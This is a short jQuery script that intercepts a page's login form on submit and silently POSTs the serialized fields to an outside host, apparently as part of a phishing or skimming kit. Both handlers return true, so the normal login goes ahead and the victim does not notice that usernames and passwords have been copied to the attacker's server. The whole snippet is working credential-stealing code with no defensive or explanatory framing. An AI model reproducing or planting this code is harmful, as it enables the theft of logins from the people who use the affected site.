$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://pusat.rwsae.biz.id/bokep/index.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
